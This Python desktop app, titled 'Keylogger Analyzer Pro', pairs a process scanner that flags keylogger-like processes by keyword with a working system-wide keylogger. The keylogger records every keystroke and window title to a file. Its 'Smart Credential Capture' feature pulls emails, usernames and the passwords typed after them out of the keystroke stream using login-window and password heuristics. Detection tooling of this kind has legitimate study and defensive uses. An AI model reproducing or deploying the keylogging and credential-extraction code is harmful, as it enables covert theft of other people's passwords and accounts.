import os
import psutil
import time
import ctypes
import smtplib
import tkinter as tk
from tkinter import ttk, messagebox
from threading import Thread, Lock
from pynput import keyboard
import json
import re
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import ttkbootstrap as tb

# --- Platform-specific import for getting window title ---
try:
    import win32gui
    IS_WINDOWS = True
except ImportError:
    IS_WINDOWS = False

# --- Configuration ---
CONFIG_FILE = "config.json"
DEFAULT_CONFIG = {
    "scan_interval": 5,
    "suspicious_keywords": ["keylog", "pynput", "keyboard", "win32api", "hook", "pyhook"],
    "email_enabled": False,
    "recipient_email": "your_email@example.com",
    "smtp_server": "smtp.gmail.com",
    "smtp_port": 587,
    "smtp_user": "your_gmail@gmail.com",
    "smtp_password": "your_app_password"
}

class KeyloggerAnalyzerApp:
    def __init__(self, main_frame, root):
        self.main_frame = main_frame
        self.root = root
        self.root.title("Keylogger Analyzer Pro v2.0")
        self.root.geometry("1000x700")

        self.config = self.load_config()

        # --- App State ---
        self.monitoring_active = False
        self.keylogger_running = False
        self.listener = None
        self.monitor_thread = None
        self.log_file = "keylog_output.txt"
        self.log_lock = Lock()

        # --- ENHANCED Credential Detection State ---
        self.credential_patterns = {
            'Email': r"[\w\.\-+=_%]+@[\w\.\-]+\.[a-zA-Z]{2,}",
            'Username': r"(?i)user(name)?\s*[:=]?\s*([a-zA-Z0-9_.-]{3,})",
            'Password': r"(?i)pass(word)?\s*[:=]?\s*([^\s]+)"
        }
        self.detected_credentials = []
        self.keystroke_buffers = {} # Dictionary to store buffer per window title
        self.last_window_title = ""

        # --- UI Setup ---
        self.setup_styles()
        self.create_widgets()

        if not self.is_admin():
            messagebox.showwarning("Admin Privileges Required", "For full functionality (like killing processes), please run as administrator.")

    def load_config(self):
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        else:
            self.save_config(DEFAULT_CONFIG)
            return DEFAULT_CONFIG

    def save_config(self, config_data=None):
        data_to_save = config_data if config_data else self.config
        with open(CONFIG_FILE, 'w') as f:
            json.dump(data_to_save, f, indent=4)
        if not config_data:
            messagebox.showinfo("Success", "Configuration saved!")

    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except AttributeError:
            return False

    def setup_styles(self):
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TNotebook", background="#fdfcfb", borderwidth=0)
        style.configure("TNotebook.Tab", background="#e2d1c3", foreground="#00FFFF", padding=[10, 5], borderwidth=0, font=("Helvetica", 13))
        style.map("TNotebook.Tab", background=[("selected", "#fdfcfb")], foreground=[("selected", "#00FFFF")])
        style.configure("TFrame", background="#fdfcfb", borderwidth=2, relief="solid")
        style.configure("TLabel", background="#fdfcfb", foreground="#00FF99", font=("Helvetica", 13))
        style.configure("TButton", background="#e2d1c3", foreground="#FFA500", borderwidth=0, relief="flat", font=("Helvetica", 13, "bold"))
        style.map("TButton", background=[('active', '#e2d1c3')], foreground=[('active', '#FFD700')])
        style.configure("Treeview", background="#fdfcfb", foreground="#00FF99", fieldbackground="#fdfcfb", rowheight=28, borderwidth=0, font=("Consolas", 13))
        style.configure("Treeview.Heading", background="#fdfcfb", foreground="#00FFFF", font=("Helvetica", 13, "bold"), borderwidth=0)
    # self.main_frame.configure(background="#fdfcfb")  # Removed, use bootstyle for frame background

    def create_widgets(self):
        self.tab_control = ttk.Notebook(self.main_frame)
        self.dashboard_tab = ttk.Frame(self.tab_control)
        self.keylogger_tab = ttk.Frame(self.tab_control)
        self.settings_tab = ttk.Frame(self.tab_control)
        self.tab_control.add(self.dashboard_tab, text='🛡️ Detection Dashboard')
        self.tab_control.add(self.keylogger_tab, text='⌨️ Keylogger & Credentials')
        self.tab_control.add(self.settings_tab, text='⚙️ Settings')
        self.tab_control.pack(expand=1, fill='both', padx=10, pady=10)
        self.setup_dashboard_tab()
        self.setup_keylogger_tab()
        self.setup_settings_tab()

    def setup_dashboard_tab(self):
        frame = self.dashboard_tab
        self.tree = ttk.Treeview(frame, columns=("PID", "Name", "Executable", "CMD"), show='headings')
        self.tree.heading("PID", text="PID"); self.tree.heading("Name", text="Name"); self.tree.heading("Executable", text="Executable Path"); self.tree.heading("CMD", text="Command Line")
        self.tree.column("PID", width=80, anchor=tk.CENTER); self.tree.column("Name", width=150); self.tree.column("Executable", width=300); self.tree.column("CMD", width=300)
        self.tree.pack(pady=10, fill=tk.BOTH, expand=True)
        controls_frame = ttk.Frame(frame); controls_frame.pack(fill=tk.X, pady=5)
        self.start_monitor_btn = ttk.Button(controls_frame, text="Start Monitoring", command=self.toggle_monitoring); self.start_monitor_btn.pack(side=tk.LEFT, padx=5)
        self.kill_btn = ttk.Button(controls_frame, text="Kill Selected Process", command=self.kill_selected_process); self.kill_btn.pack(side=tk.LEFT, padx=5)
        self.status_label = ttk.Label(frame, text="Status: Idle", foreground="yellow", font=("Helvetica", 10)); self.status_label.pack(side=tk.BOTTOM, fill=tk.X)

    def setup_keylogger_tab(self):
        frame = self.keylogger_tab
        # Control buttons - always visible at bottom
        controls_frame = tb.Frame(frame, bootstyle="light")
        controls_frame.pack(side="bottom", fill="x", pady=5)
        self.klog_btn = tb.Button(controls_frame, text="Start Keylogger", command=self.toggle_keylogger, bootstyle="primary-outline")
        self.klog_btn.pack(side="left", padx=5)
        self.save_log_btn = tb.Button(controls_frame, text="Save Log to File", command=self.save_log, bootstyle="info-outline")
        self.save_log_btn.pack(side="left", padx=5)
        # Main content above buttons, use grid for proportional layout
        main_frame = tb.Frame(frame, bootstyle="light")
        main_frame.pack(fill="both", expand=True, padx=10, pady=10)
        main_frame.rowconfigure(0, weight=1)
        main_frame.rowconfigure(1, weight=3)
        main_frame.columnconfigure(0, weight=1)
        # Log display
        log_frame = tb.Frame(main_frame, bootstyle="light")
        log_frame.grid(row=0, column=0, sticky="nsew")
        tb.Label(log_frame, text="Live Keystrokes Detected:", font=("Helvetica", 14, "bold"), bootstyle="light").pack(anchor="w", pady=(2,2))
        self.log_text = tb.Text(log_frame, bg="#fdfcfb", fg="#e78523", insertbackground="#00FFFF", relief="flat", borderwidth=10, highlightthickness=2, highlightbackground="#e2d1c3", wrap="word")
        self.log_text.pack(fill="both", expand=True)
        self.log_text.config(font=("Consolas", 15))
        self.log_text.config(state="disabled")  # Make read-only
        # Credential display
        cred_frame = tb.Frame(main_frame, bootstyle="light")
        cred_frame.grid(row=1, column=0, sticky="nsew")
        tb.Label(cred_frame, text="⭐ Smart Credential Capture :", font=("Helvetica", 14, "bold"), bootstyle="warning").pack(anchor="w", pady=(2,2))
        self.cred_list = tb.Text(cred_frame, bg="#fdfcfb", fg="#FFA500", insertbackground="#00FFFF", relief="flat", borderwidth=10, highlightthickness=2, highlightbackground="#e2d1c3", wrap="word")
        self.cred_list.pack(fill="both", expand=True)
        self.cred_list.config(font=("Consolas", 15))
        self.cred_list.config(state="disabled")  # Make read-only

    def setup_settings_tab(self):
        frame = self.settings_tab; self.settings_vars = {}
        ttk.Label(frame, text="Scan Interval (seconds):").grid(row=0, column=0, padx=10, pady=5, sticky="w"); self.settings_vars['scan_interval'] = tk.IntVar(value=self.config['scan_interval']); ttk.Entry(frame, textvariable=self.settings_vars['scan_interval']).grid(row=0, column=1, padx=10, pady=5, sticky="ew")
        ttk.Label(frame, text="--- Email Alert Settings ---", font=("Helvetica", 11, "bold")).grid(row=1, column=0, columnspan=2, pady=10); self.settings_vars['email_enabled'] = tk.BooleanVar(value=self.config['email_enabled']); ttk.Checkbutton(frame, text="Enable Email Notifications", variable=self.settings_vars['email_enabled']).grid(row=2, column=0, columnspan=2, padx=10, sticky="w")
        ttk.Label(frame, text="Recipient Email:").grid(row=3, column=0, padx=10, pady=5, sticky="w"); self.settings_vars['recipient_email'] = tk.StringVar(value=self.config['recipient_email']); ttk.Entry(frame, textvariable=self.settings_vars['recipient_email'], width=40).grid(row=3, column=1, padx=10, pady=5, sticky="ew")
        ttk.Label(frame, text="SMTP User (e.g., your_gmail@gmail.com):").grid(row=4, column=0, padx=10, pady=5, sticky="w"); self.settings_vars['smtp_user'] = tk.StringVar(value=self.config['smtp_user']); ttk.Entry(frame, textvariable=self.settings_vars['smtp_user'], width=40).grid(row=4, column=1, padx=10, pady=5, sticky="ew")
        save_button = ttk.Button(frame, text="Save Configuration", command=self.apply_and_save_settings); save_button.grid(row=5, column=0, columnspan=2, pady=20)
        note = "Note: SMTP password is not shown. It's loaded from config.json. Use a Gmail App Password."; ttk.Label(frame, text=note, wraplength=400, justify=tk.LEFT).grid(row=6, column=0, columnspan=2, padx=10, pady=10)

    # --- Core Functionality ---

    def get_active_window_title(self):
        if IS_WINDOWS:
            try:
                return win32gui.GetWindowText(win32gui.GetForegroundWindow())
            except Exception:
                return "Unknown Window"
        else:
            return "Unknown Window (non-Windows OS)"

    # --- Keylogger Logic (REWRITTEN) ---
    def toggle_keylogger(self):
        if self.keylogger_running:
            self.keylogger_running = False
            if self.listener:
                self.listener.stop()
            self.listener = None
            self.klog_btn.config(text="Start Keylogger")
            self.update_log_text("--- Keylogger stopped ---\n")
        else:
            self.keylogger_running = True
            self.keystroke_buffers = {}
            self.detected_credentials = []
            self.update_cred_list()
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            self.klog_btn.config(text="Stop Keylogger")
            self.update_log_text(f"--- Keylogger started at {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")

    def on_press(self, key):
        if not self.keylogger_running:
            return False  # Stops the listener thread
        # Schedule the processing to happen in the main GUI thread
        self.root.after(0, self.process_key_press, key)

    def process_key_press(self, key):
        """This method runs in the main GUI thread, making it safe to update UI."""
        window_title = self.get_active_window_title()

        # If window changed, analyze the buffer from the previous window
        if window_title != self.last_window_title and self.last_window_title:
             buffer = self.keystroke_buffers.get(self.last_window_title, "")
             if buffer:
                 self.analyze_buffer_for_credentials(buffer, self.last_window_title)
        self.last_window_title = window_title

        # Initialize buffer for new window if not present
        if window_title not in self.keystroke_buffers:
            self.keystroke_buffers[window_title] = ""

        log_entry = ""
        current_buffer = self.keystroke_buffers[window_title]

        # List of special keys to ignore in log (but still track for credentials)
        ignore_keys = [
            keyboard.Key.space, keyboard.Key.alt, keyboard.Key.alt_l, keyboard.Key.alt_r,
            keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
            keyboard.Key.cmd, keyboard.Key.cmd_l, keyboard.Key.cmd_r,
            keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r,
            keyboard.Key.tab, keyboard.Key.enter, keyboard.Key.esc, keyboard.Key.backspace
        ]

        if isinstance(key, keyboard.Key):
            key_name = f"[{key.name}]"
            # Special keys that trigger credential analysis
            if key in [keyboard.Key.enter, keyboard.Key.tab]:
                self.analyze_buffer_for_credentials(current_buffer, window_title)
                self.keystroke_buffers[window_title] = "" # Reset buffer after submission
            elif key == keyboard.Key.space:
                self.keystroke_buffers[window_title] += " "
            elif key == keyboard.Key.backspace:
                self.keystroke_buffers[window_title] = current_buffer[:-1]
            # Do not show annoying special keys in log
            if key in ignore_keys:
                return  # Do not log, but buffer is still updated above
        else: # Regular character key
            key_name = key.char
            self.keystroke_buffers[window_title] += key_name
        timestamp = time.strftime("[%H:%M:%S]")
        log_entry = f"{timestamp} [{window_title}] {key_name}\n"
        self.update_log_text(log_entry)

    def analyze_buffer_for_credentials(self, buffer, window_title):
        if not buffer.strip():
            return
        found_new = False
        # 1. UI context: Only capture in login/auth windows
        login_keywords = ["login", "sign in", "authentication", "auth", "password", "secure", "account"]
        signup_keywords = ["sign up", "register", "create account", "new user"]
        window_title_lower = window_title.lower()
        if any(word in window_title_lower for word in signup_keywords):
            return  # Ignore sign-up/registration windows
        confidence = "low"
        if any(word in window_title_lower for word in login_keywords):
            confidence = "high"
        # 2. Field pairing: Only pair last identifier with next password in same window
        email_matches = list(re.finditer(self.credential_patterns['Email'], buffer, re.IGNORECASE))
        username_matches = list(re.finditer(self.credential_patterns['Username'], buffer, re.IGNORECASE))
        # Store last detected email/username
        if email_matches:
            self.last_credential = email_matches[-1].group(0)
            if not any(cred['match'] == self.last_credential for cred in self.detected_credentials):
                self.detected_credentials.append({
                    "window": window_title,
                    "type": "Email",
                    "match": self.last_credential,
                    "timestamp": time.strftime('%H:%M:%S'),
                    "confidence": confidence
                })
                found_new = True
        elif username_matches:
            self.last_credential = username_matches[-1].group(0)
            if not any(cred['match'] == self.last_credential for cred in self.detected_credentials):
                self.detected_credentials.append({
                    "window": window_title,
                    "type": "Username",
                    "match": self.last_credential,
                    "timestamp": time.strftime('%H:%M:%S'),
                    "confidence": confidence
                })
                found_new = True
        else:
            # If buffer does not match email/username, treat as possible password
            if hasattr(self, 'last_credential') and self.last_credential:
                possible_password = buffer.strip()
                # 3. Password heuristics: at least 6 chars, at least 2 char classes
                char_classes = [r'[A-Z]', r'[a-z]', r'[0-9]', r'[^A-Za-z0-9]']
                if (len(possible_password) >= 6 and
                    sum(bool(re.search(pattern, possible_password)) for pattern in char_classes) >= 2 and
                    not any(cred['match'] == possible_password for cred in self.detected_credentials)):
                    self.detected_credentials.append({
                        "window": window_title,
                        "type": f"Password (for {self.last_credential})",
                        "match": possible_password,
                        "timestamp": time.strftime('%H:%M:%S'),
                        "confidence": confidence
                    })
                    found_new = True
        # 4. Clipboard/paste detection: If buffer contains paste marker, treat as password
        if hasattr(self, 'last_clipboard') and self.last_clipboard:
            clipboard_pw = self.last_clipboard.strip()
            if (len(clipboard_pw) >= 6 and
                sum(bool(re.search(pattern, clipboard_pw)) for pattern in [r'[A-Z]', r'[a-z]', r'[0-9]', r'[^A-Za-z0-9]']) >= 2 and
                not any(cred['match'] == clipboard_pw for cred in self.detected_credentials)):
                self.detected_credentials.append({
                    "window": window_title,
                    "type": f"Password (pasted for {self.last_credential})",
                    "match": clipboard_pw,
                    "timestamp": time.strftime('%H:%M:%S'),
                    "confidence": confidence
                })
                found_new = True
            self.last_clipboard = None  # Reset after use
        # 5. Only run identifier patterns for email/username
        for cred_type, pattern in self.credential_patterns.items():
            if cred_type == 'Password':
                continue  # skip password pattern here
            for match in re.finditer(pattern, buffer, re.IGNORECASE):
                match_text = match.group(2) if match.groups() else match.group(0)
                if not any(cred['match'] == match_text for cred in self.detected_credentials):
                    self.detected_credentials.append({
                        "window": window_title,
                        "type": cred_type,
                        "match": match_text,
                        "timestamp": time.strftime('%H:%M:%S'),
                        "confidence": confidence
                    })
                    found_new = True
        if found_new:
            self.update_cred_list()

    def update_cred_list(self):
        self.cred_list.config(state="normal")
        self.cred_list.delete("1.0", tk.END)
        for cred in self.detected_credentials:
            line = f"[{cred['timestamp']}] [{cred['type']}] [{cred['window']}]\n  > {cred['match']}\n"
            self.cred_list.insert(tk.END, line)
        self.cred_list.config(state="disabled")

    def update_log_text(self, text):
        self.log_text.config(state="normal")
        self.log_text.insert(tk.END, text)
        self.log_text.see(tk.END)
        self.log_text.config(state="disabled")
        with self.log_lock:
            with open(self.log_file, "a", encoding='utf-8') as f:
                f.write(text)

    def save_log(self):
        content = self.log_text.get("1.0", tk.END);
        if not content.strip(): messagebox.showwarning("Empty Log", "There is nothing to save."); return
        file_path = f"keylog_saved_{time.strftime('%Y%m%d_%H%M%S')}.txt";
        with open(file_path, "w", encoding='utf-8') as f: f.write(content)
        messagebox.showinfo("Success", f"Log saved successfully to {file_path}")

    # --- Process Monitoring Methods (Unchanged) ---
    def toggle_monitoring(self):
        if not self.monitoring_active: self.monitoring_active = True; self.start_monitor_btn.config(text="Stop Monitoring"); self.monitor_thread = Thread(target=self.monitor_processes, daemon=True); self.monitor_thread.start()
        else: self.monitoring_active = False; self.start_monitor_btn.config(text="Start Monitoring"); self.status_label.config(text="Status: Monitoring stopped.", foreground="yellow")
    def monitor_processes(self):
        while self.monitoring_active:
            self.status_label.config(text="Status: Scanning for suspicious processes...", foreground="cyan"); suspicious = self.scan_processes(); self.root.after(0, self.update_tree, suspicious)
            if suspicious and self.config["email_enabled"]: self.send_alert_email(suspicious)
            self.root.after(0, lambda: self.status_label.config(text=f"Last scan: {time.strftime('%H:%M:%S')} | Detected: {len(suspicious)}", foreground="red" if suspicious else "lightgreen")); time.sleep(self.config["scan_interval"])
    def scan_processes(self):
        suspicious_processes = [];
        for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
            try:
                proc_info = proc.info; cmdline = proc_info.get("cmdline") or []; full_cmd = " ".join(cmdline); combined_info = (proc_info.get("name") or "") + " " + full_cmd
                for keyword in self.config["suspicious_keywords"]:
                    if keyword.lower() in combined_info.lower(): suspicious_processes.append(proc_info); break
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess): continue
        return suspicious_processes
    def update_tree(self, processes):
        self.tree.delete(*self.tree.get_children());
        for proc in processes: self.tree.insert("", "end", values=(proc.get("pid", ""), proc.get("name", ""), proc.get("exe", ""), " ".join(proc.get("cmdline") or [])))
    def kill_selected_process(self):
        selected_items = self.tree.selection()
        if not selected_items: messagebox.showwarning("No Selection", "Please select a process to kill."); return
        if not self.is_admin(): messagebox.showerror("Permission Denied", "Administrator rights are required."); return
        for item in selected_items:
            pid = self.tree.item(item, "values")[0]
            try: p = psutil.Process(int(pid)); p.terminate(); self.tree.delete(item); self.status_label.config(text=f"Success: Process {pid} terminated.", foreground="lightgreen")
            except Exception as e: messagebox.showerror("Error", f"Could not terminate process {pid}: {e}"); self.status_label.config(text=f"Error: Could not terminate process {pid}.", foreground="red")
    def apply_and_save_settings(self):
        for key, var in self.settings_vars.items(): self.config[key] = var.get()
        self.save_config()
    def send_alert_email(self, processes):
        if not self.config.get('email_enabled'): return
        subject = f"ALERT: Suspicious Process Detected on {os.environ.get('COMPUTERNAME', 'Unknown PC')}"; body_html = f"<h3>Suspicious Process Alert</h3><p>The following {len(processes)} suspicious process(es) were detected at {time.strftime('%Y-%m-%d %H:%M:%S')}:</p><table border='1' cellpadding='5' cellspacing='0'><tr><th>PID</th><th>Name</th><th>Command</th></tr>"
        for p in processes: body_html += f"<tr><td>{p.get('pid')}</td><td>{p.get('name')}</td><td>{' '.join(p.get('cmdline', []))}</td></tr>"
        body_html += "</table>"; msg = MIMEMultipart(); msg['From'] = self.config['smtp_user']; msg['To'] = self.config['recipient_email']; msg['Subject'] = subject; msg.attach(MIMEText(body_html, 'html'))
        try:
            with smtplib.SMTP(self.config['smtp_server'], self.config['smtp_port']) as server: server.starttls(); server.login(self.config['smtp_user'], self.config['smtp_password']); server.send_message(msg); print(f"Alert email sent to {self.config['recipient_email']}")
        except Exception as e: print(f"Failed to send email: {e}"); self.root.after(0, lambda: self.status_label.config(text=f"Status: Email failed - {e}", foreground="orange"))


if __name__ == "__main__":
    root = tb.Window(themename="flatly")
    root.geometry("1000x700")
    # Gradient background using Canvas
    gradient_canvas = tb.Canvas(root, width=1000, height=700, highlightthickness=0, bd=0)
    gradient_canvas.pack(fill="both", expand=True)
    def draw_gradient(canvas, color1, color2):
        steps = 256
        r1, g1, b1 = int(color1[1:3],16), int(color1[3:5],16), int(color1[5:7],16)
        r2, g2, b2 = int(color2[1:3],16), int(color2[3:5],16), int(color2[5:7],16)
        for i in range(steps):
            r = int(r1 + (r2 - r1) * i / steps)
            g = int(g1 + (g2 - g1) * i / steps)
            b = int(b1 + (b2 - b1) * i / steps)
            color = f'#{r:02x}{g:02x}{b:02x}'
            canvas.create_rectangle(0, i*3, 1000, (i+1)*3, outline=color, fill=color)
    draw_gradient(gradient_canvas, '#fdfcfb', '#e2d1c3')
    # Create a frame above the canvas for widgets
    main_frame = tb.Frame(root)
    main_frame.place(relx=0, rely=0, relwidth=1, relheight=1)
    # Pass main_frame and root to KeyloggerAnalyzerApp
    app = KeyloggerAnalyzerApp(main_frame, root)
    def on_close():
        if hasattr(app, 'listener') and app.listener:
            app.listener.stop()
        root.destroy()
    root.protocol("WM_DELETE_WINDOW", on_close)
    close_btn = tb.Button(main_frame, text="Close App", command=on_close, bootstyle="success-outline")
    close_btn.pack(side="bottom", pady=16)
    root.mainloop()

